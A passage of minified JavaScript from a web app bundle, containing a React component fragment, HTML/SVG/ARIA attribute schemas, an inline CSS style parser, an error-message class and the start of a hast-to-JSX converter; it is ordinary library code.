grid gap-3 lg:grid-cols-3`,children:um.map(e=>(0,G.jsxs)(`div`,{className:`focus-strip`,children:[(0,G.jsx)(e.icon,{size:20,className:`text-amber-300`}),(0,G.jsxs)(`div`,{children:[(0,G.jsx)(`h3`,{className:`text-sm font-bold text-white`,children:e.title}),(0,G.jsx)(`p`,{className:`mt-1 text-sm leading-6 text-slate-300`,children:e.detail})]})]},e.title))})]})]})}function fm(e,t){let n=t||{};return(e[e.length-1]===``?[...e,``]:e).join((n.padRight?` `:``)+`,`+(n.padLeft===!1?``:` `)).trim()}var pm=/^[$_\p{ID_Start}][$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,mm=/^[$_\p{ID_Start}][-$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,hm={};function gm(e,t){return((t||hm).jsx?mm:pm).test(e)}var _m=/[ \t\n\f\r]/g;function vm(e){return typeof e==`object`?e.type===`text`?ym(e.value):!1:ym(e)}function ym(e){return e.replace(_m,``)===``}var bm=class{constructor(e,t,n){this.normal=t,this.property=e,n&&(this.space=n)}};bm.prototype.normal={},bm.prototype.property={},bm.prototype.space=void 0;function xm(e,t){let n={},r={};for(let t of e)Object.assign(n,t.property),Object.assign(r,t.normal);return new bm(n,r,t)}function Sm(e){return e.toLowerCase()}var Cm=class{constructor(e,t){this.attribute=t,this.property=e}};Cm.prototype.attribute=``,Cm.prototype.booleanish=!1,Cm.prototype.boolean=!1,Cm.prototype.commaOrSpaceSeparated=!1,Cm.prototype.commaSeparated=!1,Cm.prototype.defined=!1,Cm.prototype.mustUseProperty=!1,Cm.prototype.number=!1,Cm.prototype.overloadedBoolean=!1,Cm.prototype.property=``,Cm.prototype.spaceSeparated=!1,Cm.prototype.space=void 0;var wm=c({boolean:()=>Y,booleanish:()=>Em,commaOrSpaceSeparated:()=>Am,commaSeparated:()=>km,number:()=>X,overloadedBoolean:()=>Dm,spaceSeparated:()=>Om}),Tm=0,Y=jm(),Em=jm(),Dm=jm(),X=jm(),Om=jm(),km=jm(),Am=jm();function jm(){return 2**++Tm}var Mm=Object.keys(wm),Nm=class extends Cm{constructor(e,t,n,r){let i=-1;if(super(e,t),Pm(this,`space`,r),typeof n==`number`)for(;++i<Mm.length;){let e=Mm[i];Pm(this,Mm[i],(n&wm[e])===wm[e])}}};Nm.prototype.defined=!0;function Pm(e,t,n){n&&(e[t]=n)}function Fm(e){let t={},n={};for(let[r,i]of Object.entries(e.properties)){let a=new Nm(r,e.transform(e.attributes||{},r),i,e.space);e.mustUseProperty&&e.mustUseProperty.includes(r)&&(a.mustUseProperty=!0),t[r]=a,n[Sm(r)]=r,n[Sm(a.attribute)]=r}return new bm(t,n,e.space)}var Im=Fm({properties:{ariaActiveDescendant:null,ariaAtomic:Em,ariaAutoComplete:null,ariaBusy:Em,ariaChecked:Em,ariaColCount:X,ariaColIndex:X,ariaColSpan:X,ariaControls:Om,ariaCurrent:null,ariaDescribedBy:Om,ariaDetails:null,ariaDisabled:Em,ariaDropEffect:Om,ariaErrorMessage:null,ariaExpanded:Em,ariaFlowTo:Om,ariaGrabbed:Em,ariaHasPopup:null,ariaHidden:Em,ariaInvalid:null,ariaKeyShortcuts:null,ariaLabel:null,ariaLabelledBy:Om,ariaLevel:X,ariaLive:null,ariaModal:Em,ariaMultiLine:Em,ariaMultiSelectable:Em,ariaOrientation:null,ariaOwns:Om,ariaPlaceholder:null,ariaPosInSet:X,ariaPressed:Em,ariaReadOnly:Em,ariaRelevant:null,ariaRequired:Em,ariaRoleDescription:Om,ariaRowCount:X,ariaRowIndex:X,ariaRowSpan:X,ariaSelected:Em,ariaSetSize:X,ariaSort:null,ariaValueMax:X,ariaValueMin:X,ariaValueNow:X,ariaValueText:null,role:null},transform(e,t){return t===`role`?t:`aria-`+t.slice(4).toLowerCase()}});function Lm(e,t){return t in e?e[t]:t}function Rm(e,t){return Lm(e,t.toLowerCase())}var zm=Fm({attributes:{acceptcharset:`accept-charset`,classname:`class`,htmlfor:`for`,httpequiv:`http-equiv`},mustUseProperty:[`checked`,`multiple`,`muted`,`selected`],properties:{abbr:null,accept:km,acceptCharset:Om,accessKey:Om,action:null,allow:null,allowFullScreen:Y,allowPaymentRequest:Y,allowUserMedia:Y,alt:null,as:null,async:Y,autoCapitalize:null,autoComplete:Om,autoFocus:Y,autoPlay:Y,blocking:Om,capture:null,charSet:null,checked:Y,cite:null,className:Om,cols:X,colSpan:null,content:null,contentEditable:Em,controls:Y,controlsList:Om,coords:X|km,crossOrigin:null,data:null,dateTime:null,decoding:null,default:Y,defer:Y,dir:null,dirName:null,disabled:Y,download:Dm,draggable:Em,encType:null,enterKeyHint:null,fetchPriority:null,form:null,formAction:null,formEncType:null,formMethod:null,formNoValidate:Y,formTarget:null,headers:Om,height:X,hidden:Dm,high:X,href:null,hrefLang:null,htmlFor:Om,httpEquiv:Om,id:null,imageSizes:null,imageSrcSet:null,inert:Y,inputMode:null,integrity:null,is:null,isMap:Y,itemId:null,itemProp:Om,itemRef:Om,itemScope:Y,itemType:Om,kind:null,label:null,lang:null,language:null,list:null,loading:null,loop:Y,low:X,manifest:null,max:null,maxLength:X,media:null,method:null,min:null,minLength:X,multiple:Y,muted:Y,name:null,nonce:null,noModule:Y,noValidate:Y,onAbort:null,onAfterPrint:null,onAuxClick:null,onBeforeMatch:null,onBeforePrint:null,onBeforeToggle:null,onBeforeUnload:null,onBlur:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onContextLost:null,onContextMenu:null,onContextRestored:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnded:null,onError:null,onFocus:null,onFormData:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLanguageChange:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadEnd:null,onLoadStart:null,onMessage:null,onMessageError:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRejectionHandled:null,onReset:null,onResize:null,onScroll:null,onScrollEnd:null,onSecurityPolicyViolation:null,onSeeked:null,onSeeking:null,onSelect:null,onSlotChange:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnhandledRejection:null,onUnload:null,onVolumeChange:null,onWaiting:null,onWheel:null,open:Y,optimum:X,pattern:null,ping:Om,placeholder:null,playsInline:Y,popover:null,popoverTarget:null,popoverTargetAction:null,poster:null,preload:null,readOnly:Y,referrerPolicy:null,rel:Om,required:Y,reversed:Y,rows:X,rowSpan:X,sandbox:Om,scope:null,scoped:Y,seamless:Y,selected:Y,shadowRootClonable:Y,shadowRootDelegatesFocus:Y,shadowRootMode:null,shape:null,size:X,sizes:null,slot:null,span:X,spellCheck:Em,src:null,srcDoc:null,srcLang:null,srcSet:null,start:X,step:null,style:null,tabIndex:X,target:null,title:null,translate:null,type:null,typeMustMatch:Y,useMap:null,value:Em,width:X,wrap:null,writingSuggestions:null,align:null,aLink:null,archive:Om,axis:null,background:null,bgColor:null,border:X,borderColor:null,bottomMargin:X,cellPadding:null,cellSpacing:null,char:null,charOff:null,classId:null,clear:null,code:null,codeBase:null,codeType:null,color:null,compact:Y,declare:Y,event:null,face:null,frame:null,frameBorder:null,hSpace:X,leftMargin:X,link:null,longDesc:null,lowSrc:null,marginHeight:X,marginWidth:X,noResize:Y,noHref:Y,noShade:Y,noWrap:Y,object:null,profile:null,prompt:null,rev:null,rightMargin:X,rules:null,scheme:null,scrolling:Em,standby:null,summary:null,text:null,topMargin:X,valueType:null,version:null,vAlign:null,vLink:null,vSpace:X,allowTransparency:null,autoCorrect:null,autoSave:null,disablePictureInPicture:Y,disableRemotePlayback:Y,prefix:null,property:null,results:X,security:null,unselectable:null},space:`html`,transform:Rm}),Bm=Fm({attributes:{accentHeight:`accent-height`,alignmentBaseline:`alignment-baseline`,arabicForm:`arabic-form`,baselineShift:`baseline-shift`,capHeight:`cap-height`,className:`class`,clipPath:`clip-path`,clipRule:`clip-rule`,colorInterpolation:`color-interpolation`,colorInterpolationFilters:`color-interpolation-filters`,colorProfile:`color-profile`,colorRendering:`color-rendering`,crossOrigin:`crossorigin`,dataType:`datatype`,dominantBaseline:`dominant-baseline`,enableBackground:`enable-background`,fillOpacity:`fill-opacity`,fillRule:`fill-rule`,floodColor:`flood-color`,floodOpacity:`flood-opacity`,fontFamily:`font-family`,fontSize:`font-size`,fontSizeAdjust:`font-size-adjust`,fontStretch:`font-stretch`,fontStyle:`font-style`,fontVariant:`font-variant`,fontWeight:`font-weight`,glyphName:`glyph-name`,glyphOrientationHorizontal:`glyph-orientation-horizontal`,glyphOrientationVertical:`glyph-orientation-vertical`,hrefLang:`hreflang`,horizAdvX:`horiz-adv-x`,horizOriginX:`horiz-origin-x`,horizOriginY:`horiz-origin-y`,imageRendering:`image-rendering`,letterSpacing:`letter-spacing`,lightingColor:`lighting-color`,markerEnd:`marker-end`,markerMid:`marker-mid`,markerStart:`marker-start`,navDown:`nav-down`,navDownLeft:`nav-down-left`,navDownRight:`nav-down-right`,navLeft:`nav-left`,navNext:`nav-next`,navPrev:`nav-prev`,navRight:`nav-right`,navUp:`nav-up`,navUpLeft:`nav-up-left`,navUpRight:`nav-up-right`,onAbort:`onabort`,onActivate:`onactivate`,onAfterPrint:`onafterprint`,onBeforePrint:`onbeforeprint`,onBegin:`onbegin`,onCancel:`oncancel`,onCanPlay:`oncanplay`,onCanPlayThrough:`oncanplaythrough`,onChange:`onchange`,onClick:`onclick`,onClose:`onclose`,onCopy:`oncopy`,onCueChange:`oncuechange`,onCut:`oncut`,onDblClick:`ondblclick`,onDrag:`ondrag`,onDragEnd:`ondragend`,onDragEnter:`ondragenter`,onDragExit:`ondragexit`,onDragLeave:`ondragleave`,onDragOver:`ondragover`,onDragStart:`ondragstart`,onDrop:`ondrop`,onDurationChange:`ondurationchange`,onEmptied:`onemptied`,onEnd:`onend`,onEnded:`onended`,onError:`onerror`,onFocus:`onfocus`,onFocusIn:`onfocusin`,onFocusOut:`onfocusout`,onHashChange:`onhashchange`,onInput:`oninput`,onInvalid:`oninvalid`,onKeyDown:`onkeydown`,onKeyPress:`onkeypress`,onKeyUp:`onkeyup`,onLoad:`onload`,onLoadedData:`onloadeddata`,onLoadedMetadata:`onloadedmetadata`,onLoadStart:`onloadstart`,onMessage:`onmessage`,onMouseDown:`onmousedown`,onMouseEnter:`onmouseenter`,onMouseLeave:`onmouseleave`,onMouseMove:`onmousemove`,onMouseOut:`onmouseout`,onMouseOver:`onmouseover`,onMouseUp:`onmouseup`,onMouseWheel:`onmousewheel`,onOffline:`onoffline`,onOnline:`ononline`,onPageHide:`onpagehide`,onPageShow:`onpageshow`,onPaste:`onpaste`,onPause:`onpause`,onPlay:`onplay`,onPlaying:`onplaying`,onPopState:`onpopstate`,onProgress:`onprogress`,onRateChange:`onratechange`,onRepeat:`onrepeat`,onReset:`onreset`,onResize:`onresize`,onScroll:`onscroll`,onSeeked:`onseeked`,onSeeking:`onseeking`,onSelect:`onselect`,onShow:`onshow`,onStalled:`onstalled`,onStorage:`onstorage`,onSubmit:`onsubmit`,onSuspend:`onsuspend`,onTimeUpdate:`ontimeupdate`,onToggle:`ontoggle`,onUnload:`onunload`,onVolumeChange:`onvolumechange`,onWaiting:`onwaiting`,onZoom:`onzoom`,overlinePosition:`overline-position`,overlineThickness:`overline-thickness`,paintOrder:`paint-order`,panose1:`panose-1`,pointerEvents:`pointer-events`,referrerPolicy:`referrerpolicy`,renderingIntent:`rendering-intent`,shapeRendering:`shape-rendering`,stopColor:`stop-color`,stopOpacity:`stop-opacity`,strikethroughPosition:`strikethrough-position`,strikethroughThickness:`strikethrough-thickness`,strokeDashArray:`stroke-dasharray`,strokeDashOffset:`stroke-dashoffset`,strokeLineCap:`stroke-linecap`,strokeLineJoin:`stroke-linejoin`,strokeMiterLimit:`stroke-miterlimit`,strokeOpacity:`stroke-opacity`,strokeWidth:`stroke-width`,tabIndex:`tabindex`,textAnchor:`text-anchor`,textDecoration:`text-decoration`,textRendering:`text-rendering`,transformOrigin:`transform-origin`,typeOf:`typeof`,underlinePosition:`underline-position`,underlineThickness:`underline-thickness`,unicodeBidi:`unicode-bidi`,unicodeRange:`unicode-range`,unitsPerEm:`units-per-em`,vAlphabetic:`v-alphabetic`,vHanging:`v-hanging`,vIdeographic:`v-ideographic`,vMathematical:`v-mathematical`,vectorEffect:`vector-effect`,vertAdvY:`vert-adv-y`,vertOriginX:`vert-origin-x`,vertOriginY:`vert-origin-y`,wordSpacing:`word-spacing`,writingMode:`writing-mode`,xHeight:`x-height`,playbackOrder:`playbackorder`,timelineBegin:`timelinebegin`},properties:{about:Am,accentHeight:X,accumulate:null,additive:null,alignmentBaseline:null,alphabetic:X,amplitude:X,arabicForm:null,ascent:X,attributeName:null,attributeType:null,azimuth:X,bandwidth:null,baselineShift:null,baseFrequency:null,baseProfile:null,bbox:null,begin:null,bias:X,by:null,calcMode:null,capHeight:X,className:Om,clip:null,clipPath:null,clipPathUnits:null,clipRule:null,color:null,colorInterpolation:null,colorInterpolationFilters:null,colorProfile:null,colorRendering:null,content:null,contentScriptType:null,contentStyleType:null,crossOrigin:null,cursor:null,cx:null,cy:null,d:null,dataType:null,defaultAction:null,descent:X,diffuseConstant:X,direction:null,display:null,dur:null,divisor:X,dominantBaseline:null,download:Y,dx:null,dy:null,edgeMode:null,editable:null,elevation:X,enableBackground:null,end:null,event:null,exponent:X,externalResourcesRequired:null,fill:null,fillOpacity:X,fillRule:null,filter:null,filterRes:null,filterUnits:null,floodColor:null,floodOpacity:null,focusable:null,focusHighlight:null,fontFamily:null,fontSize:null,fontSizeAdjust:null,fontStretch:null,fontStyle:null,fontVariant:null,fontWeight:null,format:null,fr:null,from:null,fx:null,fy:null,g1:km,g2:km,glyphName:km,glyphOrientationHorizontal:null,glyphOrientationVertical:null,glyphRef:null,gradientTransform:null,gradientUnits:null,handler:null,hanging:X,hatchContentUnits:null,hatchUnits:null,height:null,href:null,hrefLang:null,horizAdvX:X,horizOriginX:X,horizOriginY:X,id:null,ideographic:X,imageRendering:null,initialVisibility:null,in:null,in2:null,intercept:X,k:X,k1:X,k2:X,k3:X,k4:X,kernelMatrix:Am,kernelUnitLength:null,keyPoints:null,keySplines:null,keyTimes:null,kerning:null,lang:null,lengthAdjust:null,letterSpacing:null,lightingColor:null,limitingConeAngle:X,local:null,markerEnd:null,markerMid:null,markerStart:null,markerHeight:null,markerUnits:null,markerWidth:null,mask:null,maskContentUnits:null,maskUnits:null,mathematical:null,max:null,media:null,mediaCharacterEncoding:null,mediaContentEncodings:null,mediaSize:X,mediaTime:null,method:null,min:null,mode:null,name:null,navDown:null,navDownLeft:null,navDownRight:null,navLeft:null,navNext:null,navPrev:null,navRight:null,navUp:null,navUpLeft:null,navUpRight:null,numOctaves:null,observer:null,offset:null,onAbort:null,onActivate:null,onAfterPrint:null,onBeforePrint:null,onBegin:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnd:null,onEnded:null,onError:null,onFocus:null,onFocusIn:null,onFocusOut:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadStart:null,onMessage:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onMouseWheel:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRepeat:null,onReset:null,onResize:null,onScroll:null,onSeeked:null,onSeeking:null,onSelect:null,onShow:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnload:null,onVolumeChange:null,onWaiting:null,onZoom:null,opacity:null,operator:null,order:null,orient:null,orientation:null,origin:null,overflow:null,overlay:null,overlinePosition:X,overlineThickness:X,paintOrder:null,panose1:null,path:null,pathLength:X,patternContentUnits:null,patternTransform:null,patternUnits:null,phase:null,ping:Om,pitch:null,playbackOrder:null,pointerEvents:null,points:null,pointsAtX:X,pointsAtY:X,pointsAtZ:X,preserveAlpha:null,preserveAspectRatio:null,primitiveUnits:null,propagate:null,property:Am,r:null,radius:null,referrerPolicy:null,refX:null,refY:null,rel:Am,rev:Am,renderingIntent:null,repeatCount:null,repeatDur:null,requiredExtensions:Am,requiredFeatures:Am,requiredFonts:Am,requiredFormats:Am,resource:null,restart:null,result:null,rotate:null,rx:null,ry:null,scale:null,seed:null,shapeRendering:null,side:null,slope:null,snapshotTime:null,specularConstant:X,specularExponent:X,spreadMethod:null,spacing:null,startOffset:null,stdDeviation:null,stemh:null,stemv:null,stitchTiles:null,stopColor:null,stopOpacity:null,strikethroughPosition:X,strikethroughThickness:X,string:null,stroke:null,strokeDashArray:Am,strokeDashOffset:null,strokeLineCap:null,strokeLineJoin:null,strokeMiterLimit:X,strokeOpacity:X,strokeWidth:null,style:null,surfaceScale:X,syncBehavior:null,syncBehaviorDefault:null,syncMaster:null,syncTolerance:null,syncToleranceDefault:null,systemLanguage:Am,tabIndex:X,tableValues:null,target:null,targetX:X,targetY:X,textAnchor:null,textDecoration:null,textRendering:null,textLength:null,timelineBegin:null,title:null,transformBehavior:null,type:null,typeOf:Am,to:null,transform:null,transformOrigin:null,u1:null,u2:null,underlinePosition:X,underlineThickness:X,unicode:null,unicodeBidi:null,unicodeRange:null,unitsPerEm:X,values:null,vAlphabetic:X,vMathematical:X,vectorEffect:null,vHanging:X,vIdeographic:X,version:null,vertAdvY:X,vertOriginX:X,vertOriginY:X,viewBox:null,viewTarget:null,visibility:null,width:null,widths:null,wordSpacing:null,writingMode:null,x:null,x1:null,x2:null,xChannelSelector:null,xHeight:X,y:null,y1:null,y2:null,yChannelSelector:null,z:null,zoomAndPan:null},space:`svg`,transform:Lm}),Vm=Fm({properties:{xLinkActuate:null,xLinkArcRole:null,xLinkHref:null,xLinkRole:null,xLinkShow:null,xLinkTitle:null,xLinkType:null},space:`xlink`,transform(e,t){return`xlink:`+t.slice(5).toLowerCase()}}),Hm=Fm({attributes:{xmlnsxlink:`xmlns:xlink`},properties:{xmlnsXLink:null,xmlns:null},space:`xmlns`,transform:Rm}),Um=Fm({properties:{xmlBase:null,xmlLang:null,xmlSpace:null},space:`xml`,transform(e,t){return`xml:`+t.slice(3).toLowerCase()}}),Wm={classId:`classID`,dataType:`datatype`,itemId:`itemID`,strokeDashArray:`strokeDasharray`,strokeDashOffset:`strokeDashoffset`,strokeLineCap:`strokeLinecap`,strokeLineJoin:`strokeLinejoin`,strokeMiterLimit:`strokeMiterlimit`,typeOf:`typeof`,xLinkActuate:`xlinkActuate`,xLinkArcRole:`xlinkArcrole`,xLinkHref:`xlinkHref`,xLinkRole:`xlinkRole`,xLinkShow:`xlinkShow`,xLinkTitle:`xlinkTitle`,xLinkType:`xlinkType`,xmlnsXLink:`xmlnsXlink`},Gm=/[A-Z]/g,Km=/-[a-z]/g,qm=/^data[-\w.:]+$/i;function Jm(e,t){let n=Sm(t),r=t,i=Cm;if(n in e.normal)return e.property[e.normal[n]];if(n.length>4&&n.slice(0,4)===`data`&&qm.test(t)){if(t.charAt(4)===`-`){let e=t.slice(5).replace(Km,Xm);r=`data`+e.charAt(0).toUpperCase()+e.slice(1)}else{let e=t.slice(4);if(!Km.test(e)){let n=e.replace(Gm,Ym);n.charAt(0)!==`-`&&(n=`-`+n),t=`data`+n}}i=Nm}return new i(r,t)}function Ym(e){return`-`+e.toLowerCase()}function Xm(e){return e.charAt(1).toUpperCase()}var Zm=xm([Im,zm,Vm,Hm,Um],`html`),Qm=xm([Im,Bm,Vm,Hm,Um],`svg`);function $m(e){return e.join(` `).trim()}var eh=s(((e,t)=>{var n=/\/\*[^*]*\*+([^/*][^*]*\*+)*\//g,r=/\n/g,i=/^\s*/,a=/^(\*?[-#/*\\\w]+(\[[0-9a-z_-]+\])?)\s*/,o=/^:\s*/,s=/^((?:'(?:\\'|.)*?'|"(?:\\"|.)*?"|\([^)]*?\)|[^};])+)/,c=/^[;\s]*/,l=/^\s+|\s+$/g,u=`
`,d=`/`,f=`*`,p=``,m=`comment`,h=`declaration`;function g(e,t){if(typeof e!=`string`)throw TypeError(`First argument must be a string`);if(!e)return[];t||={};var l=1,g=1;function v(e){var t=e.match(r);t&&(l+=t.length);var n=e.lastIndexOf(u);g=~n?e.length-n:g+e.length}function y(){var e={line:l,column:g};return function(t){return t.position=new b(e),C(),t}}function b(e){this.start=e,this.end={line:l,column:g},this.source=t.source}b.prototype.content=e;function x(n){var r=Error(t.source+`:`+l+`:`+g+`: `+n);if(r.reason=n,r.filename=t.source,r.line=l,r.column=g,r.source=e,!t.silent)throw r}function S(t){var n=t.exec(e);if(n){var r=n[0];return v(r),e=e.slice(r.length),n}}function C(){S(i)}function w(e){var t;for(e||=[];t=T();)t!==!1&&e.push(t);return e}function T(){var t=y();if(!(d!=e.charAt(0)||f!=e.charAt(1))){for(var n=2;p!=e.charAt(n)&&(f!=e.charAt(n)||d!=e.charAt(n+1));)++n;if(n+=2,p===e.charAt(n-1))return x(`End of comment missing`);var r=e.slice(2,n-2);return g+=2,v(r),e=e.slice(n),g+=2,t({type:m,comment:r})}}function E(){var e=y(),t=S(a);if(t){if(T(),!S(o))return x(`property missing ':'`);var r=S(s),i=e({type:h,property:_(t[0].replace(n,p)),value:r?_(r[0].replace(n,p)):p});return S(c),i}}function ee(){var e=[];w(e);for(var t;t=E();)t!==!1&&(e.push(t),w(e));return e}return C(),ee()}function _(e){return e?e.replace(l,p):p}t.exports=g})),th=s((e=>{var t=e&&e.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(e,`__esModule`,{value:!0}),e.default=r;var n=t(eh());function r(e,t){let r=null;if(!e||typeof e!=`string`)return r;let i=(0,n.default)(e),a=typeof t==`function`;return i.forEach(e=>{if(e.type!==`declaration`)return;let{property:n,value:i}=e;a?t(n,i,e):i&&(r||={},r[n]=i)}),r}})),nh=s((e=>{Object.defineProperty(e,`__esModule`,{value:!0}),e.camelCase=void 0;var t=/^--[a-zA-Z0-9_-]+$/,n=/-([a-z])/g,r=/^[^-]+$/,i=/^-(webkit|moz|ms|o|khtml)-/,a=/^-(ms)-/,o=function(e){return!e||r.test(e)||t.test(e)},s=function(e,t){return t.toUpperCase()},c=function(e,t){return`${t}-`};e.camelCase=function(e,t){return t===void 0&&(t={}),o(e)?e:(e=e.toLowerCase(),e=t.reactCompat?e.replace(a,c):e.replace(i,c),e.replace(n,s))}})),rh=s(((e,t)=>{var n=(e&&e.__importDefault||function(e){return e&&e.__esModule?e:{default:e}})(th()),r=nh();function i(e,t){var i={};return!e||typeof e!=`string`||(0,n.default)(e,function(e,n){e&&n&&(i[(0,r.camelCase)(e,t)]=n)}),i}i.default=i,t.exports=i})),ih=oh(`end`),ah=oh(`start`);function oh(e){return t;function t(t){let n=t&&t.position&&t.position[e]||{};if(typeof n.line==`number`&&n.line>0&&typeof n.column==`number`&&n.column>0)return{line:n.line,column:n.column,offset:typeof n.offset==`number`&&n.offset>-1?n.offset:void 0}}}function sh(e){let t=ah(e),n=ih(e);if(t&&n)return{start:t,end:n}}function ch(e){return!e||typeof e!=`object`?``:`position`in e||`type`in e?uh(e.position):`start`in e||`end`in e?uh(e):`line`in e||`column`in e?lh(e):``}function lh(e){return dh(e&&e.line)+`:`+dh(e&&e.column)}function uh(e){return lh(e&&e.start)+`-`+lh(e&&e.end)}function dh(e){return e&&typeof e==`number`?e:1}var fh=class extends Error{constructor(e,t,n){super(),typeof t==`string`&&(n=t,t=void 0);let r=``,i={},a=!1;if(t&&(i=`line`in t&&`column`in t||`start`in t&&`end`in t?{place:t}:`type`in t?{ancestors:[t],place:t.position}:{...t}),typeof e==`string`?r=e:!i.cause&&e&&(a=!0,r=e.message,i.cause=e),!i.ruleId&&!i.source&&typeof n==`string`){let e=n.indexOf(`:`);e===-1?i.ruleId=n:(i.source=n.slice(0,e),i.ruleId=n.slice(e+1))}if(!i.place&&i.ancestors&&i.ancestors){let e=i.ancestors[i.ancestors.length-1];e&&(i.place=e.position)}let o=i.place&&`start`in i.place?i.place.start:i.place;this.ancestors=i.ancestors||void 0,this.cause=i.cause||void 0,this.column=o?o.column:void 0,this.fatal=void 0,this.file=``,this.message=r,this.line=o?o.line:void 0,this.name=ch(i.place)||`1:1`,this.place=i.place||void 0,this.reason=this.message,this.ruleId=i.ruleId||void 0,this.source=i.source||void 0,this.stack=a&&i.cause&&typeof i.cause.stack==`string`?i.cause.stack:``,this.actual=void 0,this.expected=void 0,this.note=void 0,this.url=void 0}};fh.prototype.file=``,fh.prototype.name=``,fh.prototype.reason=``,fh.prototype.message=``,fh.prototype.stack=``,fh.prototype.column=void 0,fh.prototype.line=void 0,fh.prototype.ancestors=void 0,fh.prototype.cause=void 0,fh.prototype.fatal=void 0,fh.prototype.place=void 0,fh.prototype.ruleId=void 0,fh.prototype.source=void 0;var ph=u(rh(),1),mh={}.hasOwnProperty,hh=new Map,gh=/[A-Z]/g,_h=new Set([`table`,`tbody`,`thead`,`tfoot`,`tr`]),vh=new Set([`td`,`th`]),yh=`https://github.com/syntax-tree/hast-util-to-jsx-runtime`;function bh(e,t){if(!t||t.Fragment===void 0)throw TypeError("Expected `Fragment` in options");let n=t.filePath||void 0,r;if(t.development){if(typeof t.jsxDEV!=`function`)throw TypeError("Expected `jsxDEV` in options when `development: true`");r=jh(n,t.jsxDEV)}else{if(typeof t.jsx!=`function`)throw TypeError("Expected `jsx` in production options");if(typeof t.jsxs!=`function`)throw TypeError("Expected `jsxs` in production options");r=Ah(n,t.jsx,t.jsxs)}let i={Fragment:t.Fragment,ancestors:[],components:t.components||{},create:r,elementAttributeNameCase:t.elementAttributeNameCase||`react`,evaluater:t.createEvaluater?t.createEvaluater():void 0,filePath:n,ignoreInvalidStyle:t.ignoreInvalidStyle||!1,passKeys:t.passKeys!==!1,passNode:t.passNode||!1,schema:t.space===`svg`?Qm:Zm,stylePropertyNameCase:t.stylePropertyNameCase||`dom`,tableCellAlignToStyle:t.tableCellAlignToStyle!==!1},a=xh(i,e,void 0);return a&&typeof a!=`string`?a:i.create(e,i.Fragment,{children:a||void 0},void 0)}function xh(e,t,n){if(t.type===`element`)return Sh(e,t,n);if(t.type===`mdxFlowExpression`||t.type===`mdxTextExpression`)return Ch(e,t);if(t.type===`mdxJsxFlowElement`||t.type===`mdxJsxTextElement`)return Th(e,t,n);if(t.type===`mdxjsEsm`)return wh(e,t);if(t.type===`root`)return Eh(e,t,n);if(t.type===`text`)return Dh(e,t)}function Sh(e,t,n){let r=e.schema,i=r;t.tagName.toLowerCase()===`svg`&&r.space===`html`&&(i=Qm,e.schema=i),e.ancestors.push(t);let a=Lh(e,t.tagName,!1),o=Mh(e,t),s=Ph(e,t);return _h.has(t.tagName)&&(s=s.filter(function(e){return typeof e==`string`?!vm(e):!0})),Oh(e,o,a,t),kh(o,s),e.ancestors.pop(),e.schema=r,e.create(t,a,o,n)}function Ch(e,t){if(t.data&&t.data.estree&&e.evaluater){let n=t.data.estree.body[0];return n.type,e.evaluater.evaluateExpression(n.expression)}Rh(e,t.position)}function wh(e,t){if(t.data&&t.data.estree&&e.evaluater)return e.evaluater.evaluateProgram(t.data.estree);Rh(e,t.position)}function Th(e,t,n){let r=e.schema,i=r;t.name===`svg`&&r.space===`html`&&(i=Qm,e.schema=i),e.ancestors.push(t);let a=t.name===null?e.Fragment:Lh(e,t.name,!0),o=Nh(e,t),s=Ph(e,t);return Oh(e,o,a,t),kh(o,s),e.ancestors.pop(),e.schema=r,e.create(t,a,o,n)}function Eh(e,t,n){let r={};return kh(r,Ph(e,t)),e.create(t,e.Fragment,r,n)}function Dh(e,t){return t.value}function Oh(e,t,n,r){typeof n!=`string`&&n!==e.Fragment&&e.passNode&&(t.node=r)}function kh(e,t){if(t.length>0){let n=t.length>1?t:t[0];n&&(e.children=n)}}function Ah(e,t,n){return r;function r(e,r,i,a){let o=Array.isArray(i.children)?n:t;return a?o(r,i,a):o(r,i)}}function jh(e,t){return n;function n(n,r,i,a){let o=Array.isArray(i.children),s=ah(n);return t(r,i,a,o,{columnNumber:s?s.column-1:void 0,fileName:e,lineNumber:s?s.line:void 0},void 0)}}function Mh(e,t){let n={},r,i;for(i in t.properties)if(i!==`children`&&mh.call(t.properties,i)){let a=Fh(e,i,t.properties[i]);if(a){let[i,o]=a;e.tableCellAlignToStyle&&i===`align`&&typeof o==`string`&&vh.has(t.tagName)?r=o:n[i]=o}}if(r){let t=n.style||={};t[e.stylePropertyNameCase===`css`?`text-align`:`textAlign`]=r}return n}function Nh(e,t){let n={};for(let r of t.attributes)if(r.type===`mdxJsxExpressionAttribute`)if(r.data&&r.data.estree&&e.evaluater){let t=r.data.estree.body[0];t.type;let i=t.expression;i.type;let a=i.properties[0];a.type,Object.assign(n,e.evaluater.evaluateExpression(a.argument))}else Rh(e,t.position);else{let i=r.name,a;if(r.value&&typeof 